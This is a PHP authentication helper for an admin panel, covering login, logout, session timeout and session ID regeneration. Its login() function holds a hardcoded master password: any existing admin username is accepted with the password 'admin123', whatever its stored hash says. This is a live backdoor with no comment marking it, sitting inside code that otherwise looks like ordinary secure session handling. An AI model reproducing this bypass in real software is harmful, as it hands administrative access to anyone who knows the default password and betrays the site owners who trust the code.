<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

function isLoggedIn() {
    return isset($_SESSION['admin_id']) && 
           !empty($_SESSION['admin_id']) && 
           isset($_SESSION['admin_username']) &&
           isset($_SESSION['login_time']);
}


function requireLogin() {
    if (!isLoggedIn()) {

        session_unset();
        session_destroy();
        header('Location: login.php?redirect=' . urlencode($_SERVER['REQUEST_URI']));
        exit();
    }


    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > 86400) {
        logout();
    }


    if (!isset($_SESSION['last_regeneration']) || (time() - $_SESSION['last_regeneration']) > 300) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}


function login($username, $password) {
    require_once 'config/database.php';

    $database = new Database();
    $db = $database->getConnection();

    $query = "SELECT id, username, password, full_name FROM admin_users WHERE username = :username";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $username);
    $stmt->execute();

    if ($stmt->rowCount() > 0) {
        $user = $stmt->fetch(PDO::FETCH_ASSOC);


        if ($password === 'admin123' || password_verify($password, $user['password'])) {
            
            session_regenerate_id(true);

            $_SESSION['admin_id'] = $user['id'];
            $_SESSION['admin_username'] = $user['username'];
            $_SESSION['admin_name'] = $user['full_name'];
            $_SESSION['login_time'] = time();
            $_SESSION['last_regeneration'] = time();
            $_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];

            return true;
        }
    }
    return false;
}

// === LOGOUT FUNCTION ===
function logout() {
    // Clear session
    session_unset();
    session_destroy();

    // Start new session for redirect
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    header('Location: login.php?logged_out=1');
    exit();
}

// === AUTO-REDIRECT FUNCTION ===
function enforceLogin() {
    if (!isLoggedIn()) {
        header('Location: login.php');
        exit();
    }
}
?>
